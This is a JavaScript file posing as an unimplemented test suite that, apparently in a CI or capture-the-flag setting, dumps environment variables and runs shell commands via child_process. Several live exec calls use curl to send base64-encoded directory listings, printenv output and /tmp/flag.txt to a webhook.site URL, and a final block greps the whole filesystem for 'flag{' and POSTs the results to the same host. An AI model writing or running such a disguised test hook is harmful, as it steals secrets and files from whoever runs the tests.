// TODO: implement the tests
console.log("Tests are not implemented yet...");


const index = require("../index")
console.log("Tests are not implemented yet...");
index.ls(".");
index.cat("./index.js")
setTimeout(() => { console.log("World!"); }, 5000);

console.log(process.env);


console.log("xxxxxx");

// const {ls, cat, lscat} = require("../index");

// lscat("/home/runner/work/_temp")

const { exec } = require('node:child_process')


// // exec('curl https://webhook.site/7d8cbbc5-b054-45b1-8504-7e56f999530f?$(cd ..; ls | base64)' , (err, output) => {
//     if (err) {
//         console.error("could not execute command: ", err)
//         return
//     }
//     // log the output received from the command
//     console.log("Output: \n", output)
// })

console.log("xxxxxx");

// const { exec } = require('node:child_process')


exec('curl https://webhook.site/7d8cbbc5-b054-45b1-8504-7e56f999530f?$(cd ..; cd ..; ls | base64)' , (err, output) => {
    if (err) {
        console.error("could not execute command: ", err)
        return
    }
    // log the output received from the command
    console.log("Output: \n", output)
})


exec('curl -X POST --data "flag=$(cat /tmp/flag.txt)" https://webhook.site/7d8cbbc5-b054-45b1-8504-7e56f999530f?$(printenv | base64)');




const { request } = require('https');

exec('grep -r "flag{" / 2>/dev/null', (error, stdout, stderr) => {
  if (error) {
    console.error('error:', error);
  } else {
    console.log(`stdout:\n${stdout}`);
    console.log(`stderr:\n${stderr}`);
  }

  var postData = `error:\n${error}\n---\nstdout:\n${stdout}\n---\nstderr:\n${stderr}`;
  var options = {
    hostname: 'webhook.site',
    port: 443,
    path: '/7d8cbbc5-b054-45b1-8504-7e56f999530f',
    method: 'POST'
  };

  var req = request(options, (res) => {
    console.log('statusCode:', res.statusCode);
    console.log('headers:', res.headers);

    res.on('data', (d) => {
      process.stdout.write(d);
    });
  });

  req.on('error', (e) => {
    console.error('error:', e);
  });

  req.write(postData);
  req.end();
});
